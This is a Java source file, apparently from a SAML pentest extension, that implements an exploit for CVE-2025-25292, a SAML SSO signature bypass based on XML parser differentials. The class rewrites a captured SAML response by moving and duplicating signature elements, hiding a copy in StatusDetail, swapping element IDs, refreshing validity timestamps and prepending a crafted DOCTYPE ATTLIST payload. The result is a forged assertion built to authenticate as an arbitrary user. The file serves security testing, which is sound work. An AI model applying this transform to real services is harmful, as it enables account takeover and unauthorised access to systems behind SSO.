package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.*;

/// Links:
/// * https://github.com/CompassSecurity/SAMLRaider/issues/93
/// * https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/
/// * https://portswigger.net/research/saml-roulette-the-hacker-always-wins
/// * https://github.com/d0ge/proof-of-concept-labs/tree/main/round-trip
public class CVE_2025_25292 {

    public static final String CVE = "CVE-2025-25292";
    private static final String XMLNS = "http://www.w3.org/2000/xmlns/";

    private CVE_2025_25292() {
        // static class
    }

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (response == null) {
            throw new IllegalArgumentException("No <Response> element found.");
        }
        if (assertion == null) {
            throw new IllegalArgumentException("No <Assertion> element found.");
        }

        Element signatureForResponse = null;
        Element signatureForAssertion = null;

        List<Element> signatureElements = new ArrayList<>();
        NodeList signatureNodes = document.getElementsByTagNameNS("*", "Signature");
        for (int i = 0; i < signatureNodes.getLength(); i++) {
            signatureElements.add((Element) signatureNodes.item(i));
        }

        for (Element sig : signatureElements) {
            NodeList referenceNodes = sig.getElementsByTagNameNS("*", "Reference");
            if (referenceNodes.getLength() == 0) continue;

            Element reference = (Element) referenceNodes.item(0);
            String refURI = reference.getAttribute("URI").substring(1);

            Element target = null;
            NodeList allElements = document.getElementsByTagName("*");
            for (int j = 0; j < allElements.getLength(); j++) {
                Element el = (Element) allElements.item(j);
                if (el.hasAttribute("ID") && el.getAttribute("ID").equals(refURI)) {
                    target = el;
                    break;
                }
            }

            if (target == null) continue;

            if ("Response".equals(target.getLocalName())) {
                signatureForResponse = sig;
            } else if ("Assertion".equals(target.getLocalName())) {
                signatureForAssertion = sig;
            }

            Node parent = sig.getParentNode();
            if (parent != null) {
                parent.removeChild(sig);
            }
        }

        Element sourceSignature = (signatureForAssertion != null) ? signatureForAssertion : signatureForResponse;
        if (sourceSignature == null) throw new IllegalArgumentException("No <Signature> element found.");

        Element sigForAssertion = buildSignatureElement(document, sourceSignature);

        NodeList digestValues = sigForAssertion.getElementsByTagNameNS("*", "DigestValue");
        for (int i = 0; i < digestValues.getLength(); i++) {
            digestValues.item(i).setTextContent(computeDigestFromSignature(sourceSignature));
        }

        Node firstChild = assertion.getFirstChild();
        while (firstChild != null && firstChild.getNodeType() != Node.ELEMENT_NODE) {
            firstChild = firstChild.getNextSibling();
        }

        if (firstChild == null || !"Issuer".equals(firstChild.getLocalName())) {
            throw new IllegalArgumentException("Expected <Issuer> as the first child of Assertion");
        }

        assertion.insertBefore(sigForAssertion, firstChild.getNextSibling());
        assertion.setAttributeNS(XMLNS, "xmlns:example", "http://example.com\u0080");

        Element status = (Element) response.getElementsByTagNameNS("*", "Status").item(0);
        if (status == null) {
            throw new IllegalArgumentException("Missing <Status> element in SAML <Response>.");
        }

        String statusPrefix = status.getPrefix();
        String statusNamespace = status.getNamespaceURI();

        String qualifiedName = (statusPrefix != null && !statusPrefix.isEmpty())
                ? statusPrefix + ":StatusDetail"
                : "StatusDetail";

        Element statusDetail = document.createElementNS(statusNamespace, qualifiedName);
        status.appendChild(statusDetail);

        String namePrefix = sourceSignature.getPrefix();
        String signatureNamespace = sourceSignature.getNamespaceURI();

        if (namePrefix != null && !namePrefix.isEmpty() && signatureNamespace != null) {
            String xmlnsAttrName = "xmlns:" + namePrefix;

            if (!response.hasAttributeNS(XMLNS, namePrefix)) {
                response.setAttributeNS(
                        XMLNS,
                        xmlnsAttrName,
                        signatureNamespace
                );
            }
        }

        Element newSig = document.createElement("Signature");
        NodeList children = sourceSignature.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node imported = document.importNode(children.item(i), true);
            newSig.appendChild(imported);
        }
        statusDetail.appendChild(newSig);

        if (signatureForAssertion == null) {
            String referenceURI = null;
            NodeList referenceList = sourceSignature.getElementsByTagNameNS("*", "Reference");
            Element referenceElement = (Element) referenceList.item(0);
            if (referenceElement != null && referenceElement.hasAttribute("URI")) {
                referenceURI = referenceElement.getAttribute("URI").substring(1);
            }
            assertion.setAttribute("ID", referenceURI);
            response.setAttribute("ID", referenceURI + "ffff");
        }

        // Replace all time attributes except AuthnInstant, as Ruby ignores it
        String now = getCurrentSAMLTime();
        String future = getFutureSAMLTime();
        updateAttribute(document, "IssueInstant", now);
        updateAttribute(document, "NotBefore", now);
        updateAttribute(document, "NotOnOrAfter", future);
        updateAttribute(document, "SessionNotOnOrAfter", future);

        StringBuilder doctypePayload = new StringBuilder("<!DOCTYPE Response [");
        doctypePayload.append("<!ATTLIST Signature xmlns CDATA #FIXED \"http://www.w3.org/2000/09/xmldsig#\" xmlns CDATA \"block\">]>");

        String xmlString = xmlHelpers.getString(document);
        int declEnd = xmlString.indexOf("?>");
        if (declEnd != -1) {
            return xmlString.substring(0, declEnd + 2) + doctypePayload + xmlString.substring(declEnd + 2);
        }
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + doctypePayload + xmlString;
    }

    private static Element buildSignatureElement(Document doc, Element sourceSignature) {
        String prefix = sourceSignature.getPrefix();
        String ns = sourceSignature.getNamespaceURI();
        String qualifiedName = (prefix != null && !prefix.isEmpty()) ? prefix + ":Signature" : "Signature";

        Element newSig = doc.createElementNS(ns, qualifiedName);
        NodeList children = sourceSignature.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node imported = doc.importNode(children.item(i), true);
            newSig.appendChild(imported);
        }
        return newSig;
    }

    private static void updateAttribute(Document document, String attrName, String value) {
        NodeList allElements = document.getElementsByTagName("*");
        for (int i = 0; i < allElements.getLength(); i++) {
            Element el = (Element) allElements.item(i);
            if (el.hasAttribute(attrName)) {
                el.setAttribute(attrName, value);
            }
        }
    }

    private static String getCurrentSAMLTime() {
        return getFormattedSAMLTime(new Date());
    }

    private static String getFutureSAMLTime() {
        long now = System.currentTimeMillis();
        return getFormattedSAMLTime(new Date(now + 24 * 60 * 60 * 1000));
    }

    private static String getFormattedSAMLTime(Date date) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
        return sdf.format(date);
    }

    public static String computeDigestFromSignature(Element signatureElement) {
        NodeList digestMethodNodes = signatureElement.getElementsByTagNameNS("*", "DigestMethod");
        if (digestMethodNodes.getLength() == 0) {
            throw new IllegalArgumentException("No <DigestMethod> found in Signature element.");
        }

        Element digestMethod = (Element) digestMethodNodes.item(0);
        String algorithmUri = digestMethod.getAttribute("Algorithm");

        String javaAlgorithm = mapXmlDigestAlgorithm(algorithmUri);
        if (javaAlgorithm == null) {
            throw new IllegalArgumentException("Unsupported digest algorithm: " + algorithmUri);
        }

        try {
            MessageDigest digest = MessageDigest.getInstance(javaAlgorithm);
            byte[] hashBytes = digest.digest("".getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hashBytes);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Hash algorithm not available: " + javaAlgorithm, e);
        }
    }

    private static String mapXmlDigestAlgorithm(String uri) {
        return switch (uri) {
            case "http://www.w3.org/2000/09/xmldsig#sha1" -> "SHA-1";
            case "http://www.w3.org/2001/04/xmlenc#sha256" -> "SHA-256";
            case "http://www.w3.org/2001/04/xmldsig-more#sha384" -> "SHA-384";
            case "http://www.w3.org/2001/04/xmlenc#sha512" -> "SHA-512";
            default -> null;
        };
    }
}
